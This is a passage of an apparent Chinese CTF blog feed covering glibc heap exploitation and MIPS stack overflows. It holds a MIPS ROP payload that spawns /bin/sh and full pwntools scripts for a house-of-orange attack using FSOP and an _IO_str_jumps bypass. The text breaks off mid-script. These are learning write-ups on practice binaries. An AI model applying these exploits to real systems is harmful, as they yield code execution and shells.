edit(1,2,'\xdd\x25')edit(0,0x70,'\x00'*0x68+p64(0x71))add(0,0x68)add(1,0x68)pay = 0x33*'A' + p64(0xfbad1800) + p64(0)*3 + '\x00'edit(1,len(pay),pay)stderr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))print hex(stderr)libc_base = stderr +0x20 -libc.symbols['_IO_2_1_stdout_'] print hex(libc_base)malloc_hook = libc_base + libc.symbols['__malloc_hook']print hex(malloc_hook)fack_chunk = malloc_hook - 0x23onegadget = one[3] + libc_baseadd(0,0x68)delt(0)gdb.attach(p)edit(0,8,p64(fack_chunk))add(0,0x68)add(1,0x68)pay = 0x13*'A' + p64(onegadget)edit(1,len(pay),pay)add(1,0x20)p.interactive()]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mips编译环境配置与简单栈溢出]]></title>
    <url>%2F2020%2F05%2F12%2Fmips%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[环境编译首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天） buildroot下载：buildroot 解压之后，configs里面有一个qemu_mips32r2el_malta_defconfig这样的配置，可以进去找找看有没有，我们回到主目录，直接make qemu_mips32r2el_malta_defconfig 12coyote@ubuntu:~/buildroot-2020.02.1$ make qemu_mips32r2el_malta_defconfigcoyote@ubuntu:~/buildroot-2020.02.1$ make make qemu…那个命令就是配置相对应的环境，就不用手动make menuconfig 去设置了。 进入menuconfig界面之后选择第一项Target Architecture，改成MIPS（little endian）（默认编译小端程序），另外，选择Toolchain，将Kernel Headers的Linux版本改成自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的） 之后make就好了（过程可能会很漫长，耐心等吧编译完成之后，在buildroot/output/host/bin下就有mipsel-linux-gcc了，我们就可以通过它编译了 1~/buildroot-2020.02.1/output/host/bin/mipsel-linux-gcc test.c -o test -static 不过这样还是有点麻烦，所以我们可以直接配置环境变量 123gedit ~/.bashrcexport PATH=$PATH:/home/coyote/buildroot-2020.02.1/output/host/usr/bin #写入文件source ~/.bashrc 然后我们就可以直接通过命令编译,不用带上路径了 1mipsel-linux-gcc test.c -o test -static IDA mipsrop下载 mipsrop.py 直接放到plugins下,然后重启就可以在ida的search里面找到mips rop gadgets 点击这个之后，可以在idapython框里面输入mipsrop的命令，主要如下 1234mipsrop.stackfinder() # 寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系mipsrop.summary() # 列出所有的可用 ropmipsrop.system() # 寻找命令执行的的ropmipsrop.find(xxx) # 查找 find 函数参数的 rop，类似正则匹配 mips反编译这真是个令人头秃的东西 mips反编译有三个： retdecghidrajeb-mips ida retdec 插件 retdec-idaplugin：https://github.com/avast/retdec-idaplugin/releasesretdec：https://github.com/avast/retdec/releases 步骤： 把idaplugin里面的两个dll放到ida下面的plugins里面 打开ida，在options下面找到 RetDec Plugin Setting... 点击去，把下载好的retdec文件下的retdec-decompiler.py（在bin里面）的地址链入RetDec script里面 点 Edit-&gt;plugins-&gt;retargetable decompiler就可以实现反编译出c了（快捷键好像是ctrl+d，不过因机而定的） 这个反编译出来的代码真的好丑啊！不知道是不是我的问题，它真的就是c文件，只能从上往下看。 还不如直接python /path/to/retdec-decompiler.py test 编译出c文件之后在vs里面看，至少还有代码高亮。 如果有大佬的retdec可以反编译得很方便的话就教教我吧！ jeb-mips由于实在忍不了retdec的简略，就尝试了jeb-mips jeb-mips：https://www.pnfsoftware.com/jeb/demomips 解压之后windows下就直接点jeb_wincon.bat运行（不过不知道是不是我电脑的问题还是java版本的问题，点开之后运行个一分钟就会自动退出）大佬的Mac是可以运行的，我的win挣扎了一个下午也没解决这个问题，最后安在了linux下 Ghidra我不是很熟jeb的操作，data变code我都很迷茫，右键disassemble好像没有作用（这个可能是我的问题，和软件无关）所以我又去找了ghidra下载 ghidra（要梯子）：https://ghidra-sre.org/ghidra_9.0.4_PUBLIC_20190516.zip 解压之后直接点ghidraRun.bat运行，好像是会新建一个工程，然后在file-&gt;import file选择你想反编译的文件导入工程，文件就会显示在窗口里，如图 双击文件名就可以打开了 效果如图： 双击汇编就可以解析成伪c（感觉上代码好冗杂，看起来可能比较费时间），但是它选中汇编代码右键会有很多不同的disassemble模式，比如MIPS、MIPS16el、static等等 mips的指令集特点主要的两个概念 叶子函数：当前函数不再调用其他函数。 非叶子函数：当前函数调用其他函数。 指令特点： 固定4字节指令长度。 MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。 流水线效应。MIPS采用了高度的流水线，最重要的两个效应就是分支延迟效应和载入延迟效应。 没有堆栈直接操作的指令，也就是没有 push 和 pop 指令 具体可以参考： mips的汇编基础 mips的指令和用法 mips的溢出rop链用了全网都在用的那个例子，也是《揭秘家用路由器0day漏洞挖掘技术》里面的例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat("passwd",&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen("passwd","rb")) == NULL) &#123; printf("Cannot open file passwd!n"); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = 'x00'; if(!strcmp(buf,"adminpwd")) &#123; do_system_0(count,"ls -l"); &#125; else &#123; printf("you have an invalid password!n"); &#125; fclose(fp);&#125; 编译完之后，丢进ida看看程序是干什么的 会发现程序读入了一个passwd文件，然后passwd不对就会输出”you have an invalid password!n” 我们要利用溢出来绕过这个 所以我们先往passwd里面填充大量字符 1coyote@ubuntu:~/mips_test$ python -c "print 'a'*0x200" &gt; passwd 起qemu，然后gdb连接 123456789#terminal 1coyote@ubuntu:~/mips_test$ qemu-mipsel -g 1234 ./test #-g是开放远程连接，gdb调试，1234是开放的端口#terminal 2coyote@ubuntu:~/mips_test$ gdb-multiarch ./testpwndbg&gt; target remote :1234 attach# 如果第一次远程调的话，先# pwndbg&gt;set arch mips# pwndbg&gt;set endian little gdb的调试分析过程：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354pwndbg&gt; target remote :1234 attachpwndbg&gt; cContinuing.Program received signal SIGSEGV, Segmentation fault.0x61616161 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── V0 0x0 V1 0x1 A0 0x1 A1 0x1 A2 0x4b A3 0x39 T0 0x0 T1 0x2a7f6573 T2 0xffffffff T3 0x64726f77 ('word') T4 0x0 T5 0x0 T6 0x0 T7 0x0 T8 0x1e T9 0x40479c (__pthread_return_0) ◂— jr $ra S0 0x0 S1 0x410000 (__preinit_array_start) ◂— 0xffffffff S2 0x0 S3 0x0 S4 0x0 S5 0x0 S6 0x0 S7 0x0 S8 0x61616161 ('aaaa') FP 0x76ffec48 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0' SP 0x76ffec48 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0' PC 0x61616161 ('aaaa')───────────────────────────────────[ DISASM ]───────────────────────────────────Invalid address 0x61616161───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ fp sp 0x76ffec48 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'... ↓─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 61616161──────────────────────────────────────────────────────────────────────────────── 通过这里可以看到跳转地址被改为了0x61616161，而存放这个内容的地址是0x76ffec48,所以计算从开始读入passwd文件的位置到跳转地址的字符偏移。 1234567891011121314151617181920212223pwndbg&gt; x/40gx 0x76ffea000x76ffea00: 0x00402744004105f4 0x0000000076ffea7c0x76ffea10: 0x0000000000000000 0x004011e0004181e00x76ffea20: 0x004105f800413c80 0x00000000000000020x76ffea30: 0x0000000000413c80 0x00000000000000000x76ffea40: 0x00400a3476ffea78 0x00400ac0000000000x76ffea50: 0x00000000000001b6 0x00000000004181e00x76ffea60: 0x0041000000000000 0x00000000000000000x76ffea70: 0x004006a000000000 0x0040e76a000000000x76ffea80: 0x0000000000001000 0x00000000004181e00x76ffea90: 0x00000201000000ff 0x00414908000002010x76ffeaa0: 0x0041490800414908 0x61616161616161610x76ffeab0: 0x6161616161616161 0x61616161616161610x76ffeac0: 0x6161616161616161 0x61616161616161610x76ffead0: 0x6161616161616161 0x61616161616161610x76ffeae0: 0x6161616161616161 0x61616161616161610x76ffeaf0: 0x6161616161616161 0x61616161616161610x76ffeb00: 0x6161616161616161 0x61616161616161610x76ffeb10: 0x6161616161616161 0x61616161616161610x76ffeb20: 0x6161616161616161 0x61616161616161610x76ffeb30: 0x6161616161616161 0x6161616161616161pwndbg&gt; distance 0x76ffeaa8 0x76ffec480x76ffeaa8-&gt;0x76ffec48 is 0x1a0 bytes (0x68 words) 所以我们要填充&#39;a&#39;*0x19c使得跳转地址没有被覆盖 ida里通过mips rop找到可用的rop 1234567Python&gt;mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------| Address | Action | Control Jump |----------------------------------------------------------------------------------------------------------------| 0x004034A0 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) |----------------------------------------------------------------------------------------------------------------Found 1 matching gadgets addiu $a1,$sp,0x58+var_40 –&gt; sp+0x18的位置放入参数(即’/bin/sh’) 0x58+var_40 = 0x58-0x40 = 0x18 jr 0x58+var_4($sp) –&gt; 跳转执行sp+0x54位置的函数 0x58+var_4($sp) = 0x58 - 0x4 = 0x54 1234pwndbg&gt; p/x $sp+24$2 = 0x76ffec60pwndbg&gt; distance 0x76ffec60 0x76ffeaa80x76ffec60-&gt;0x76ffeaa8 is -0x1b8 bytes (-0x6e words) 思路：其实之前的那个跳转地址就是我们的sp，所以我们再填充0x18个字节之后填入&#39;/bin/sh/x00&#39;作为system的参数，然后再填0x34个字节后，填入do_system的地址 exp：1234coyote@ubuntu:~/mips_test$ python -c "print 'a'*0x19c + '\xa0\x34\x40\x00' + 0x18*'b' + '/bin/sh\x00' + 'c'*0x34 + '\x70\x03\x40\x00'" &gt; passwdcoyote@ubuntu:~/mips_test$ qemu-mipsel ./test$ lspasswd test test_1 test.c 参考链接： https://www.jianshu.com/p/ba12cd4e530a https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow 书目推荐： 《揭秘家用路由器0day漏洞挖掘技术》（pdf版）]]></content>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_orange]]></title>
    <url>%2F2020%2F03%2F10%2Fhouse-of-orange%2F</url>
    <content type="text"><![CDATA[其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。 对于house of orange操作的理解（glibc2.23）大体上是，没有free函数，通过改写top chunk，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。 在_int_malloc函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，如果都不符合，接下来_int_malloc函数会试图使用 top chunk。 如果top chunk也无法满足的话，会执行以下的代码 123456789/*Otherwise, relay to handle system-dependent cases*/else &#123; void *p = sysmalloc(nb, av); if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0)) alloc_perturb (p, bytes); return p;&#125; 则需要执行 sysmalloc来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展（就是malloc的size要小于mmap的size），之后原有的 top chunk 会被置于 unsorted bin 中。 在 sysmalloc 函数中存在对 top chunk size 的 check，如下 1234assert((old_top == initial_top(av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)); 这里是对top chunk 的合法性的检查。 想要伪造 ++top chunk++，就要满足以下几点： 伪造的 size 必须要对齐到内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。 这里用houseoforange这个题来操作一下吧 例子这题没有free操作，让人很容易联想得到house_of_orange的操作，upgrade对写入的size没有检查，可以直接溢出。 它结合了house of orange、unsorted bin attack 和FSOP的知识点 house of orange使在没有free的条件下改写topchunk，下一次malloc一个大于topchunk的size则可以将它写进unsorted bin的队列了 unsorted bin attack，通过malloc large bin（&gt;=512)，可以达到同时leak libc和heap的效果。随后再利用upgrade溢出，构造new chunk，在它的bk处存入_IO_list_all-0x10的地址（这个注意，unsorted bin attack的bk覆写一定是在之前并没有add的堆块，即被free掉的或者和这题的覆写一样的） FSOP，通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。 其中，unsorted bin attack和FSOP都是在最后一步malloc（0x10）的时候才实现的 关于IO FILE后面两步都会与一个叫_IO_FILE_plus的结构体有关系，那我们就先来看一下这个结构体吧 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; 而指向这个结构体的指针叫做_IO_list_all，它存在于符号表内（即可以libc.sym[‘_IO_list_all’]操作），定义如下 1extern struct _IO_FILE_plus *_IO_list_all; _IO_list_all一般指向的都是_IO_2_1_stderr正常的程序中存在stderr、sdout以及stdin三个IO FILE，他们之间的关系呢大概是这样的 就是 _IO_list_all-&gt;_IO_2_1_stderr _IO_2_1_stderr-&gt;_IO_2_1_stdout _IO_2_1_stdout-&gt;_IO_2_1_stdin 既然它牵扯到了IO FILE结构体里的东西，那我们就再倒回来说说这个结构体吧 _IO_FILE_plus结构体的第一part IO FILE的file结构（用gdb来看吧） 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *((struct _IO_FILE_plus *) 0x7f733765e540)$2 = &#123; file = &#123; _flags = -72540026, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f733765e620 &lt;_IO_2_1_stdout_&gt;, _fileno = 2, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x7f733765f770 &lt;_IO_stdfile_2_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7f733765d660 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7f733765c6e0 &lt;_IO_file_jumps&gt;&#125; chain指向的是下一个IO FILE结构体 而vtable呢是一个虚表指针，指向的是_IO_file_jumps 刚好_IO_FILE_plus的第二part就是这个虚表了： 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 在我们将IO_list_all链接进unsorted bin之后，unsortedbin的结构被破坏（IO_read_ptr=0,即size=0），再进行malloc就会触发malloc printerr报错 1234if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); 触发之后 1234函数大致调用链mallloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数//define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) _IO_flush_all_lockp源码： 123456789101112131415161718192021222324252627282930_IO_flush_all_lockp (int do_lock)&#123; int result = 0; FILE *fp;#ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock);#endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; &#125;#ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0);#endif return result;&#125; 要想调用到IO_overflow,就要满足if的绕过条件，即： ((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是 _IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 12可以将write_base-&gt;0,write_ptr-&gt;0x1,满足write_base&lt;write_ptr也可以改_wide_data为原old_top-0x10就好了，fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，在wide_data的io结构里，writer_base变成了之前的read_end,即我们构造的fd，writer_ptr变成了read_base,即我们构造的bk（io_list_all-0x10),只要满足前者的等式就好了 第一种会相对来说方便一点 然后把vtable指向自己，再把system填入IO_OVERFLEW，执行的时候就可以getshell了 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'p = process('./houseoforange')elf = ELF('./houseoforange')libc = elf.libcdef add(size,name,price,color): p.recvuntil("Your choice : ") p.sendline("1") p.recvuntil("name :") p.sendline(str(size)) p.recvuntil("Name :") p.send(name) p.recvuntil("Orange:") p.sendline(str(price)) p.recvuntil("Orange:") p.sendline(str(color))def upgrade(size,name,price,color): p.recvuntil("Your choice : ") p.sendline("3") p.recvuntil("name :") p.sendline(str(size)) p.recvuntil("Name:") p.send(name) p.recvuntil("Orange:") p.sendline(str(price)) p.recvuntil("Orange:") p.sendline(str(color))def see(): p.recvuntil("Your choice : ") p.sendline("2")add(0x10,'aaaa',32,1)# gdb.attach(p)upgrade(0x40,'a'*0x10+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xfa1),32,1)add(0xfb0,'aaaa',32,1) #in unsorted bin listadd(0x400,'b'*8,32,1)# gdb.attach(p)see()p.recvuntil('b'*8)main_arena = u64(p.recv(6).ljust(8,'\x00')) - 1640print hex(main_arena)libc_base = main_arena - 0x3c4b20print hex(libc_base)upgrade(0x400,'b'*0x10,32,1)see()p.recvuntil('b'*0x10)heap_addr=u64(p.recv(6).ljust(8,'\x00'))print hex(heap_addr)_IO_list_all = libc.symbols['_IO_list_all'] + libc_basesystem = libc.symbols['system'] + libc_base#满足_IO_write_base &lt; _IO_write_ptr# pay = 'a'*0x400# pay += p64(0) + p64(0x21) + 'a'*0x10# io_file = '/bin/sh\x00' + p64(0x61) #'/bin/sh'是IO FILE，最后会作为IO_overflower的参数 victim-&gt;size=0# io_file += p64(0) +p64(_IO_list_all-0x10) #unsorted bin attack 把list_all写进unsorted bin队列里面，即list_all-&gt;构造的堆块处(not io_stderr)# io_file += p64(0) + p64(1) #绕检查_IO_write_base &lt; _IO_write_ptr# io_file += p64(0) * 18# io_file += p64(0) * 3# io_file += p64(heap_addr+0x508) #vtable -&gt;指向自己# pay += io_file + p64(0)*2# pay += p64(system)# upgrade(0x800,pay,32,1)# 满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_basepayload="x"*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)fake_chunk='/bin/sh\x00'+p64(0x61)#why ? io_file?fake_chunk+=p64(0)+p64(_IO_list_all-0x10)fake_chunk=fake_chunk.ljust(0xa0,'\x00')fake_chunk+=p64(heap_addr+0x420) # wide_data -&gt; read_end 然后就会调用虚表+0x18偏移处的函数了fake_chunk=fake_chunk.ljust(0xc0,'\x00')fake_chunk+=p64(1)payload+=fake_chunkpayload += p64(0)payload += p64(0)payload += p64(heap_addr+0x528) payload += p64(1)payload += p64(2)payload += p64(3)payload += p64(0)*3 # vtablepayload += p64(system)upgrade(0x800,payload,32,2)gdb.attach(p)#unsortbin.bk也被改写成了&amp;IO_list_all-0x10，所以此时的victim-&gt;size=0那么不会通过校验，进入malloc_printerr，触发异常。p.recvuntil("Your choice : ")p.sendline("1") #如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数p.interactive() 关于构造chunk的size为什么是0x60： 首先victim-&gt;size=0（IO FILE的伪unsorted bin结构里，size=0）会触发malloc printer（就是那个malloc错误）这个时候就会去调用IO_list_all那个系列的函数 在IO_FILE结构体中，偏移0x60的字段是struct _IO_marker *_markers，偏移0x68的字段是struct _IO_FILE *_chain。而这两个的值恰恰是old_top的起始地址。 原来改为0x60是为了将old_top加入smallbin[4]，而smallbin[4]的fd和bk指针恰好对应于IO_FILE结构体中的_markers和_chain字段。就能跳转至我们的old_top了 实现FSOP的调试在malloc最后一个堆块前我们去gdb里在_int_malloc看一下调用 出现error的字样时，chunk被写进smallbin[4] 此时的IO_FILE进入main_arena 此时chain的值为fack_chunk的地址，即old_top (这里是第二种绕过方式的截图) old_top里面chain为0，则往vtable执行 house of orange在glibc2.24下的利用glibc2.24开始引入vtable 的检测函数—— IO_validate_vtable 1234567891011121314static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; vtable需要满足的条件： 在 stop_IO_vtables 和 start_libc_IO_vtables 之间 而我们伪造的vtable通常不满足这个条件，但是可以找到 ==IO_str_jumps== 符合条件。（接下来就分析利用IO_str_jumps的绕过） __IO_str_jumps 结构如下: 1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =&#123; JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_str_finish), JUMP_INIT(overflow, _IO_str_overflow), JUMP_INIT(underflow, _IO_str_underflow), JUMP_INIT(uflow, _IO_default_uflow), JUMP_INIT(pbackfail, _IO_str_pbackfail), JUMP_INIT(xsputn, _IO_default_xsputn), JUMP_INIT(xsgetn, _IO_default_xsgetn), JUMP_INIT(seekoff, _IO_str_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_default_setbuf), JUMP_INIT(sync, _IO_default_sync), JUMP_INIT(doallocate, _IO_default_doallocate), JUMP_INIT(read, _IO_default_read), JUMP_INIT(write, _IO_default_write), JUMP_INIT(seek, _IO_default_seek), JUMP_INIT(close, _IO_default_close), JUMP_INIT(stat, _IO_default_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue)&#125;; 我们利用_IO_str_finish进行接下来的绕过和利用 其源码为： 12345678void _IO_str_finish (FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) // call qword ptr [fp+0E8h] (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 我们可以知道绕过的条件是： 12fp-&gt;_flags= 0fp-&gt;_IO_buf_base = binsh_addr 此时我们使vtable存放指向_IO_str_jumps - 8处的指针 ，这样调用_IO_overflow时会调用到_IO_str_finish 不过，由于_IO_str_jumps不在符号表内，所以只能通过其他函数来间接得到它的地址，例如_IO_str_underflow，我们已知_IO_str_jumps 的地址大于_IO_file_jumps 地址，可以用此来确认_IO_str_underflow的地址，并且_IO_str_underflow=_IO_str_jummps+0x20 然后我在大佬的博客里看到一个特别6的方法可以直接算出偏移（不用手算！）： 1234567IO_file_jumps_offset = libc.sym['_IO_file_jumps']IO_str_underflow_offset = libc.sym['_IO_str_underflow']for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: print possible_IO_str_jumps_offset break 因为满足了if之后，会call qword ptr [fp+0E8h] 所以我们使 1fp+0xe8 = system_addr 就可以实现getshell了 这个方法在glibc 2.23和glibc 2.24里都适用 所以我们用上面那题来试一下这个方法，运用了大佬微博里自定义的的封装函数，构造我们的exp，然后就发现我们getshell成功了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = &apos;debug&apos;p = process(&apos;./houseoforange&apos;)elf = ELF(&apos;./houseoforange&apos;)libc = elf.libcdef add(size,name,price,color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;name :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Name :&quot;) p.send(name) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(color))def upgrade(size,name,price,color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;name :&quot;) p.sendline(str(size)) p.recvuntil(&quot;Name:&quot;) p.send(name) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Orange:&quot;) p.sendline(str(color))def see(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;2&quot;)def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \ p32(0) + \ p64(_IO_read_ptr) + \ p64(_IO_read_end) + \ p64(_IO_read_base) + \ p64(_IO_write_base) + \ p64(_IO_write_ptr) + \ p64(_IO_write_end) + \ p64(_IO_buf_base) + \ p64(_IO_buf_end) + \ p64(_IO_save_base) + \ p64(_IO_backup_base) + \ p64(_IO_save_end) + \ p64(_IO_marker) + \ p64(_IO_chain) + \ p32(_fileno) file_struct = file_struct.ljust(0x88, &quot;\x00&quot;) file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;) file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, &apos;\x00&apos;) file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;) return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr): payload = pack_file(_flags = 0, _IO_read_ptr = 